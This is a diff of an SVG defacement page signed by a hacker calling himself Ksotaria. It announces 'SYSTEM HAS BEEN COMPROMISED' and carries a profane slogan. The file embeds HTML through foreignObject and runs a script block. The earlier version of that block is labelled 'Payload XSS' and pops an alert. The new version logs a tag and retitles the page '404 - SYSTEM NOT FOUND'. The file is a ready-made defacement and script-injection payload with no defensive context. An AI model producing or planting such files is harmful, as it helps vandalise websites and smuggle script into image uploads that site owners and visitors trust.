@@ -1,39 +1,101 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
-  <rect width="100%" height="100%" fill="#000000" />
+  <rect width="100%" height="100%" fill="#050505" />
 
   <foreignObject width="100%" height="100%">
-    <div xmlns="http://www.w3.org/1999/xhtml" style="color:#ff0000; font-family:'Courier New',monospace; text-align:center; height:100vh; padding-top:20%;">
-      
-      <h1 style="font-size: 50px; text-shadow: 0 0 15px #ff0000; margin: 0; animation: fastBlink 0.8s infinite;">HACKED BY ./KSOTARIA</h1>
-      
-      <p style="color: #ffffff; letter-spacing: 5px; font-size: 20px;">YOUR SECURITY IS AN ILLUSION</p>
-      
-      <div style="border: 1px solid #ff0000; display: inline-block; padding: 15px; margin-top: 20px; font-size: 15px;">
-        [+] Greetz: my self [+]
-      </div>
-      
-      <p style="color: #444444; margin-top: 50px; font-size: 12px;">#FuckYou_Mafia</p>
-
+    <div xmlns="http://www.w3.org/1999/xhtml">
       <style>
-        @keyframes fastBlink {
-          0% { opacity: 1; }
-          40% { opacity: 0.2; }
-          50% { opacity: 0.9; }
-          60% { opacity: 0.1; }
-          100% { opacity: 1; }
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&amp;display=swap');
+
+        body {
+          margin: 0;
+          padding: 0;
+          background: transparent;
+          font-family: 'Share Tech Mono', monospace;
+          color: #ff0000;
+          height: 100vh;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          overflow: hidden;
+        }
+
+        /* Overlay Scanline */
+        .scanlines {
+          position: fixed;
+          top: 0; left: 0; width: 100%; height: 100%;
+          background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+          background-size: 100% 2px, 3px 100%;
+          pointer-events: none;
+          z-index: 10;
+        }
+
+        .container {
+          text-align: center;
+          z-index: 5;
+        }
+
+        h1 {
+          font-size: 4rem;
+          margin: 0;
+          text-transform: uppercase;
+          letter-spacing: 10px;
+          animation: glitch 1s i infinite;
+          text-shadow: 0.05em 0 0 rgba(255,0,0,.75), -0.025em -0.05em 0 rgba(0,255,0,.75), 0.025em .05em 0 rgba(0,0,255,.75);
+        }
+
+        .subtitle {
+          color: #fff;
+          font-size: 1.2rem;
+          letter-spacing: 4px;
+          margin-top: 10px;
+          opacity: 0.8;
+        }
+
+        .msg-box {
+          margin-top: 30px;
+          padding: 10px 20px;
+          border: 1px solid #ff0000;
+          background: rgba(255, 0, 0, 0.1);
+          box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+        }
+
+        .footer {
+          margin-top: 60px;
+          color: #333;
+          font-size: 0.8rem;
+        }
+
+        @keyframes glitch {
+          0% { text-shadow: 0.05em 0 0 #f00, -0.05em -0.025em 0 #0f0, 0.025em 0.05em 0 #00f; }
+          14% { text-shadow: 0.05em 0 0 #f00, -0.05em -0.025em 0 #0f0, 0.025em 0.05em 0 #00f; }
+          15% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.025em 0 #0f0, -0.05em -0.05em 0 #00f; }
+          49% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.025em 0 #0f0, -0.05em -0.05em 0 #00f; }
+          50% { text-shadow: 0.025em 0.05em 0 #f00, 0.05em 0 0 #0f0, 0 -0.05em 0 #00f; }
+          99% { text-shadow: 0.025em 0.05em 0 #f00, 0.05em 0 0 #0f0, 0 -0.05em 0 #00f; }
+          100% { text-shadow: -0.025em 0 0 #f00, -0.025em -0.025em 0 #0f0, -0.025em -0.05em 0 #00f; }
         }
       </style>
+      <div class="scanlines"></div>
+      <div class="container">
+        <h1>./KSOTARIA</h1>
+        <div class="subtitle">SYSTEM HAS BEEN COMPROMISED</div>
+        <div class="msg-box">
+          [ STATUS: HACKED BY KSOTARIA 1337 ]<br/>
+          [ GREETZ: MY SELF &amp; ALL INDO HACKER ]
+        </div>
+        <div class="footer">#FuckYou_Mafia</div>
+      </div>
     </div>
   </foreignObject>
 
   <script type="text/javascript">
     <![CDATA[
-      // Payload XSS
-      alert('ksotaria is here');
-
+      // Payload Verifikasi
+      console.log("Touched by Ksotaria");
       try {
-        document.title = "Hacked By Ksotaria";
+        document.title = "404 - SYSTEM NOT FOUND";
       } catch(e) {}
     ]]>
   </script>
